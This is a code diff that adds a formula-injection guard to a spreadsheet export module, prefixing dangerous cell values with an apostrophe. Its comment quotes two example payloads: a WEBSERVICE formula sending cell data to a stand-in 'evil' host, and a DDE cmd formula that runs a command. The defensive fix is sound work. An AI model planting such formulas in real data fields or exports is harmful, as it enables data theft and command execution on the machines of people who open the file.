@@ -48,9 +48,30 @@ function attachHeader(ws: ExcelJS.Worksheet, title: string, device: DeviceHeader
   ws.addRow([]);
 }
 
+// Excel/CSV formula-injection guard (audit M2). A cell whose string value
+// starts with = + - @ (or a leading tab/CR) is interpreted as a formula by
+// Excel/Sheets — so a device/place/driver/geofence name like
+// `=WEBSERVICE("http://evil/?d="&A1)` or `=cmd|'/c calc'!A1` would execute or
+// exfiltrate when a colleague opens the export. Prefix such values with an
+// apostrophe so they render as literal text. Runs over every cell so it also
+// covers any future column. Numbers/dates (non-string cells) are untouched.
+export function hardenWorkbook(wb: ExcelJS.Workbook): void {
+  wb.eachSheet((ws) => {
+    ws.eachRow({ includeEmpty: false }, (row) => {
+      row.eachCell({ includeEmpty: false }, (cell) => {
+        const v = cell.value;
+        if (typeof v === 'string' && /^[=+\-@\t\r]/.test(v)) {
+          cell.value = "'" + v;
+        }
+      });
+    });
+  });
+}
+
 async function workbookToBuffer(wb: ExcelJS.Workbook): Promise<Buffer> {
   wb.creator = 'Fleex';
   wb.created = new Date();
+  hardenWorkbook(wb);
   const buf = await wb.xlsx.writeBuffer();
   return Buffer.from(buf);
 }
